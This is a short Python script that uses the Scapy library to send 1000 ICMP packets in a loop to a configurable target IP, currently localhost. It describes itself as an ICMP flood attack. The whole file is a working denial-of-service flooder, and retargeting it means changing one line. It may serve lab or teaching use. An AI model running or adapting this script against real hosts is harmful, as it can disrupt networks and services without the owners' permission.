from scapy.all import *
import time

target_ip = "127.0.0.1"  # Target IP (localhost)
packet_count = 1000      # Number of packets to send

# Crafting the ICMP packet
packet = IP(dst=target_ip)/ICMP()

print(f"Starting ICMP flood attack on {target_ip} with {packet_count} packets.")

# Sending the packets in a loop
for i in range(packet_count):
    send(packet, verbose=0)  # Sending packet without verbose output
    if i % 100 == 0:
        print(f"Sent {i+1} packets...")

print("Attack finished.")
